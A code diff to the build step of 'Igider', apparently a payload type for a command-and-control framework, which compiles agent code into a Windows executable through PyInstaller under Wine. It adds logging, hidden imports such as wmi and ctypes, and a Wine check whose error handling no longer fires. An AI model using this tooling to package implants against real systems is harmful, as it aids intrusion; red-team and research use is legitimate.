@@ -93,6 +93,9 @@ class Igider(PayloadType):
     def _setup_logger(self) -> logging.Logger:
         logger = logging.getLogger("igider_builder")
         logger.setLevel(logging.DEBUG)
+        handler = logging.FileHandler("/tmp/igider_builder.log")
+        handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
+        logger.addHandler(handler)
         return logger
 
     def get_file_path(self, directory: pathlib.Path, file: str) -> str:
@@ -347,8 +350,10 @@ def check_environment():
     def _build_exe(self, code: str, temp_dir: str) -> bytes:
         """Compile Python code into an executable using PyInstaller."""
         try:
-            # Ensure temporary directory exists
+            # Ensure temporary directory exists and is writable
             os.makedirs(temp_dir, exist_ok=True)
+            if not os.access(temp_dir, os.W_OK):
+                raise RuntimeError(f"Temporary directory {temp_dir} is not writable")
             self.logger.debug(f"Using temporary directory: {temp_dir}")
 
             # Create temporary file for the code
@@ -366,7 +371,7 @@ def check_environment():
             if pyinstaller_check.returncode != 0:
                 raise RuntimeError(f"PyInstaller not found or failed to run: {pyinstaller_check.stderr}")
 
-            # PyInstaller command
+            # PyInstaller command with explicit hidden imports
             output_path = os.path.join(temp_dir, "igider.exe")
             pyinstaller_cmd = [
                 "pyinstaller",
@@ -375,14 +380,18 @@ def check_environment():
                 "--distpath", temp_dir,
                 "--workpath", os.path.join(temp_dir, "build"),
                 "--specpath", os.path.join(temp_dir, "spec"),
-                "--log-level", "INFO",
+                "--log-level", "DEBUG",
+                "--hidden-import", "cryptography",
+                "--hidden-import", "pycryptodome",
+                "--hidden-import", "wmi",
+                "--hidden-import", "ctypes",
                 temp_file_path
             ]
 
-            # Run PyInstaller
+            # Run PyInstaller under Wine
             self.logger.debug(f"Running PyInstaller command: {' '.join(pyinstaller_cmd)}")
             result = subprocess.run(
-                pyinstaller_cmd,
+                ["wine"] + pyinstaller_cmd,
                 capture_output=True,
                 text=True
             )
@@ -391,11 +400,22 @@ def check_environment():
                 self.logger.error(f"PyInstaller failed with exit code {result.returncode}")
                 self.logger.error(f"PyInstaller stdout: {result.stdout}")
                 self.logger.error(f"PyInstaller stderr: {result.stderr}")
+                # Log directory contents for debugging
+                try:
+                    dir_contents = os.listdir(temp_dir)
+                    self.logger.debug(f"Temporary directory contents: {dir_contents}")
+                except:
+                    self.logger.debug(f"Could not list temporary directory contents: {temp_dir}")
                 raise RuntimeError(f"PyInstaller failed: {result.stderr}")
 
             # Verify the executable exists
             if not os.path.exists(output_path):
                 self.logger.error(f"Executable not found at: {output_path}")
+                try:
+                    dir_contents = os.listdir(temp_dir)
+                    self.logger.debug(f"Temporary directory contents: {dir_contents}")
+                except:
+                    self.logger.debug(f"Could not list temporary directory contents: {temp_dir}")
                 raise FileNotFoundError(f"Executable not found at: {output_path}")
 
             # Read the compiled executable
@@ -512,11 +532,12 @@ def check_environment():
                         if os.name != 'posix':
                             raise RuntimeError("EXE compilation is only supported on Linux with Wine for cross-compilation")
                         
-                        # Verify required dependencies
+                        # Verify Wine is installed and configured
                         try:
-                            subprocess.run(["wine", "--version"], capture_output=True, check=True)
-                        except subprocess.CalledProcessError:
-                            raise RuntimeError("Wine is required for EXE compilation but not found")
+                            wine_check = subprocess.run(["wine", "--version"], capture_output=True, text=True)
+                            self.logger.debug(f"Wine version: {wine_check.stdout.strip()}")
+                        except subprocess.CalledProcessError as e:
+                            raise RuntimeError(f"Wine is required for EXE compilation but not found: {e}")
                         
                         resp.payload = self._build_exe(base_code, temp_dir)
                         resp.build_message = "Successfully built executable payload"
